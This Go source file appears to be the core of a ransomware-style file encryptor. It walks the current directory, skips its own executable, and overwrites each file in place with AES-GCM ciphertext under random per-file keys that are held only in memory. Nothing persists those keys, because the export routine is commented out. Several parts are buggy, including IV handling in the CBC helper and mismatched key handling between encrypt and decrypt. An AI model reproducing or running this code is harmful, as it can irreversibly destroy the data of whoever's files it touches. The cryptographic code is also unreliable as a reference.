package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"
	"runtime"

	"golang.org/x/crypto/blake2b"
)

func check(e error) {
	if e != nil {
		panic(e)
	}
}

/* --- New Types --- */

// CBCKey organizes CBC keys with nonce
type CBCKey struct {
	key []byte
	iv  []byte
}

func (k *CBCKey) jsonify() []byte {
	b, err := json.Marshal(k)
	check(err)
	return b
}

// GCMKey organizes GCM keys with nonce
type GCMKey struct {
	key         []byte
	keyID       int
	salt        []byte
	nonce       []byte
	nonceLength int
	cbcKey      CBCKey
}

// KeyList keeps track of iterative key lists
type KeyList struct {
	keys     []GCMKey // Number of keys can be inferred by len(keyList.keys)
	ivLength int
}

// NewKeyList initializes a new KeyList
func NewKeyList(ivL int) KeyList {
	keyList := KeyList{}
	keyList.ivLength = ivL

	return keyList
}

// Securely exports keys from each file
/*
func (fs *FileList) export() ([]byte, GCMKey) {

}
*/

// Returns rounded subkey
func (kl *KeyList) newKey() GCMKey {
	kl.ivLength = aes.BlockSize

	key := NewGMCKey()

	key.keyID = len(kl.keys)

	kl.keys = append(kl.keys, key)

	return key
}

// getKey returns key given ID in KeyList
func (kl *KeyList) getKey(keyID int) GCMKey {
	for _, key := range kl.keys {
		if key.keyID == keyID {
			return key
		}
	}
	fmt.Printf("KeyID lookup failed\n KeyID :%v, key list length :%v\n", keyID, len(kl.keys))
	panic("No key found with that ID")
}

// printAllKeys returns key given ID in KeyList
func (kl *KeyList) printAllKeys() {
	for _, key := range kl.keys {
		fmt.Printf("KeyID:%v Key:%x\n", key.keyID, key.key)
	}
}

/* --- Type Constructors --- */

// NewCBCKey initializes CBCKey with random key and IV
func NewCBCKey() CBCKey {
	cbcKey := CBCKey{}

	cbcKey.key, _ = getBytes(aes.BlockSize)
	cbcKey.iv, _ = getBytes(aes.BlockSize)
	return cbcKey
}

// NewGMCKey initializes GMCKey with key, salt, and nonce
func NewGMCKey() GCMKey {
	gcmKey := GCMKey{}
	gcmKey.nonceLength = 12

	// Never use more than 2^32 random nonces with a given key because of the risk of a repeat.
	gcmKey.nonce, _ = getBytes(gcmKey.nonceLength)
	gcmKey.key, gcmKey.salt = getPass()

	gcmKey.cbcKey = NewCBCKey()

	return gcmKey
}

/* --- Encryption Methods --- */

func encryptCBC(key []byte, plaintext []byte, iv []byte) []byte {
	block, err := aes.NewCipher(pad(key, aes.BlockSize)[:aes.BlockSize])
	if err != nil {
		panic(err)
	}
	plaintext = pad(plaintext, block.BlockSize())
	ciphertext := make([]byte, aes.BlockSize+len(plaintext))
	bm := cipher.NewCBCEncrypter(block, iv)
	bm.CryptBlocks(ciphertext[aes.BlockSize:], plaintext)
	return ciphertext
}

func decryptCBC(key []byte, ciphertext []byte) []byte {
	block, err := aes.NewCipher(pad(key, aes.BlockSize))
	check(err)

	iv := ciphertext[:aes.BlockSize]
	ciphertext = ciphertext[aes.BlockSize:]

	bm := cipher.NewCBCDecrypter(block, iv)
	bm.CryptBlocks(ciphertext, ciphertext)
	ciphertext = trim(ciphertext, aes.BlockSize)
	return ciphertext
}

// @DEBUG Prints each element of GCMKey #TODO automate this
func (k *GCMKey) print() {
	fmt.Printf("---Start Key---\n")
	fmt.Printf("KeyID :%v\n", k.keyID)
	fmt.Printf("Salt :%x\n", k.salt)
	fmt.Printf("Nonce :%x\n", k.nonce)
	fmt.Printf("Key :%x\n", k.key)
	fmt.Printf("\t---Start SubKey---\n")
	fmt.Printf("\tIV :%x\n", k.cbcKey.iv)
	fmt.Printf("\tKey :%x\n", k.cbcKey.key)
	fmt.Printf("\t---End SubKey---\n")
	fmt.Printf("---End Key---\n")

}

// Encrypts authenticated data
func encryptGCM(gcmKey GCMKey, pt []byte) []byte {
	block, err := aes.NewCipher(gcmKey.key)
	check(err)

	aesgcm, err := cipher.NewGCM(block)
	check(err)

	// Using the encrypted nonce for the Authenticated Data
	ad := encryptCBC(gcmKey.cbcKey.key, gcmKey.nonce, gcmKey.cbcKey.iv)

	var ciphertext []byte
	ciphertext = aesgcm.Seal(ciphertext, gcmKey.nonce, pt, ad)
	return ciphertext
}

// Decrypts authenticated data
func decryptGCM(gcmKey GCMKey, ct []byte) []byte {

	block, err := aes.NewCipher(gcmKey.key)
	check(err)

	aesgcm, err := cipher.NewGCM(block)
	check(err)

	// Using the encrypted nonce for the Authenticated Data
	ad := encryptCBC(gcmKey.cbcKey.key, gcmKey.nonce, gcmKey.cbcKey.iv)

	var pt []byte
	pt, err = aesgcm.Open(pt, gcmKey.nonce, ct, ad)
	check(err)

	return pt
}

// Pads data
func pad(b []byte, blocksize int) []byte {
	n := blocksize - (len(b) % blocksize)
	pb := make([]byte, len(b)+n)
	copy(pb, b)
	copy(pb[len(b):], bytes.Repeat([]byte{byte(n)}, n))
	return []byte(pb)
}

// Trims padding
func trim(b []byte, blocksize int) []byte {
	c := b[len(b)-1]
	n := int(c)
	return b[:len(b)-n]
}

// FileList allows iterability and discovery. Also manages key
type FileList struct {
	files []File
}

// DiscoverFilesInDirectory automates discovery of files in directory and returns FileList
func DiscoverFilesInDirectory(dir string) FileList {
	fl := FileList{}

	// Check to resolve self-encryption, defaults to linux
	fn := os.Args[0][2:]
	if runtime.GOOS == "windows" {
		fn = os.Args[0]
	}

	err := filepath.Walk(".",
		func(p string, info os.FileInfo, err error) error {
			check(err)
			if !info.IsDir() && fn != p {
				fl.addFile(p)
			}
			// It's worth noting that for linux systems,
			return nil
		})
	check(err)
	return fl
}

// Adds file to FileList
func (fl *FileList) addFile(fn string) {
	fl.files = append(fl.files, NewFile(fn))
}

// File allows file.encrypt() and file.decrypt() for GCM
type File struct {
	name string
	key  GCMKey
}

// NewFile initializes a new file
func NewFile(fn string) File {
	newFile := File{}

	newFile.key = NewGMCKey()

	newFile.name = fn

	return newFile
}

// Encrypts file
func (f *File) encrypt() {
	pt, err := ioutil.ReadFile(f.name)
	check(err)

	ct := encryptGCM(f.key, pt)

	w, _ := os.Create(f.name)
	defer w.Close()
	w.Write(ct)
}

// Decrypts file
func (f *File) decrypt() {
	ct, err := ioutil.ReadFile(f.name)
	check(err)

	pt := decryptGCM(f.key, ct)

	w, _ := os.Create(f.name)
	defer w.Close()
	w.Write(pt)
}

// Returns random bytes of n length
func getBytes(n int) ([]byte, error) {
	k := make([]byte, n)
	_, err := rand.Read(k)
	return k, err
}

// Fixes the typing error [n]byte -> []byte
func getHash(dat []byte) []byte {
	hash := blake2b.Sum256(dat)
	var r = hash[:]
	return r
}

// Return salted key and salt
func getPass() ([]byte, []byte) {
	k, _ := getBytes(aes.BlockSize)
	s, _ := getBytes(aes.BlockSize / 2)
	sk := append(k, s...)

	return getHash(sk), s
}
